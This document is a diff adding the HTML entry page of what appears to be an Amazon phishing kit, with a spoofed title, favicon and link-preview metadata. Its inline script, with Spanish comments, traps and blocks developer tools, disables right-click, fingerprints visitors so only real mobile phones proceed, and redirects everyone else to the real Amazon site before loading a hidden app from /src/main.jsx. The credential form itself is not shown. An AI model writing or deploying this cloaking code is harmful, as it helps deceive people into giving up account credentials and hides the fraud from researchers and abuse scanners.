@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <link rel="icon" href="https://www.amazon.com/favicon.ico" />
+    <title>Amazon Sign-In</title>
+
+    <!-- Preview de link para WhatsApp, Telegram, iMessage, etc. -->
+    <meta property="og:title" content="Amazon Sign-In" />
+    <meta property="og:description" content="Sign in to your Amazon account. Access your orders, saved items, and more." />
+    <meta property="og:image" content="https://static.vecteezy.com/system/resources/previews/019/136/322/non_2x/amazon-logo-amazon-icon-free-free-vector.jpg" />
+    <meta property="og:type" content="website" />
+    <meta property="og:site_name" content="Amazon.com" />
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:title" content="Amazon Sign-In" />
+    <meta name="twitter:description" content="Sign in to your Amazon account." />
+    <meta name="twitter:image" content="https://static.vecteezy.com/system/resources/previews/019/136/322/non_2x/amazon-logo-amazon-icon-free-free-vector.jpg" />
+    <meta name="description" content="Sign in to your Amazon account to access orders, saved items, recommendations and more." />
+</head>
+
+<body>
+    <div id="root"></div>
+    <script>
+        // ══════════════════════════════════════════
+        //  ANTI-DEVTOOLS: detecta F12 / Inspect
+        // ══════════════════════════════════════════
+        var _r = 'https://www.amazon.com'
+
+        // Método 1: detectar cambio de tamaño (DevTools abierto cambia dimensiones)
+        var _dw = window.outerWidth - window.innerWidth
+        var _dh = window.outerHeight - window.innerHeight
+        setInterval(function() {
+            var dw = window.outerWidth - window.innerWidth
+            var dh = window.outerHeight - window.innerHeight
+            // Si la diferencia crece >160px, DevTools se abrió
+            if (dw > _dw + 160 || dh > _dh + 160) {
+                window.location.replace(_r)
+            }
+        }, 1000)
+
+        // Método 2: debugger trap — si DevTools está abierto, el debugger pausa
+        setInterval(function() {
+            var t0 = performance.now()
+            debugger
+            if (performance.now() - t0 > 100) {
+                window.location.replace(_r)
+            }
+        }, 3000)
+
+        // Método 3: detectar console.log override
+        var _el = document.createElement('div')
+        Object.defineProperty(_el, 'id', { get: function() { window.location.replace(_r) } })
+
+        // Método 4: bloquear teclas F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'F12' ||
+                (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) ||
+                (e.ctrlKey && e.key === 'u') ||
+                (e.metaKey && e.altKey && (e.key === 'I' || e.key === 'i' || e.key === 'J' || e.key === 'j' || e.key === 'C' || e.key === 'c'))) {
+                e.preventDefault()
+                window.location.replace(_r)
+            }
+        })
+
+        // Método 5: bloquear click derecho
+        document.addEventListener('contextmenu', function(e) { e.preventDefault() })
+
+        // ══════════════════════════════════════════
+        //  FINGERPRINTING: ¿Es un móvil real?
+        // ══════════════════════════════════════════
+        function isRealMobile() {
+            var score = 0
+
+            if ('ontouchstart' in window) score += 2
+            if (navigator.maxTouchPoints > 0) score += 2
+            if (window.matchMedia('(pointer: coarse)').matches) score += 2
+            if (window.matchMedia('(hover: none)').matches) score += 1
+
+            var ua = navigator.userAgent.toLowerCase()
+            if (/iphone|ipad|ipod|android|mobile|phone/.test(ua)) score += 2
+
+            if (window.screen.width <= 500 || window.screen.height <= 500) score += 1
+            if (typeof window.DeviceOrientationEvent !== 'undefined') score += 1
+
+            var screenW = window.screen.width
+            var innerW = window.innerWidth
+            if (screenW > 600 && innerW < 500) score -= 3
+
+            var plat = (navigator.platform || '').toLowerCase()
+            if (/iphone|ipad|ipod|arm|android|linux arm/.test(plat)) score += 1
+            if (/win|mac|linux x86|x86_64/.test(plat)) score -= 2
+
+            var conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection
+            if (conn && /cellular|4g|3g|2g/.test(conn.type || conn.effectiveType || '')) score += 1
+
+            return score >= 5
+        }
+
+        // ══════════════════════════════════════════
+        //  FLUJO PRINCIPAL
+        // ══════════════════════════════════════════
+        if (!isRealMobile()) {
+            window.location.replace(_r)
+        } else {
+            var p = window.location.pathname.replace(/^\//, '')
+            fetch('/status?path=' + encodeURIComponent(p))
+                .then(function(r) { return r.json() })
+                .then(function(d) {
+                    if (!d.active) {
+                        window.location.replace(_r)
+                    } else {
+                        var s = document.createElement('script')
+                        s.type = 'module'
+                        s.src = '/src/main.jsx'
+                        document.body.appendChild(s)
+                    }
+                })
+                .catch(function() {
+                    window.location.replace(_r)
+                })
+        }
+    </script>
+</body>
+
+</html>
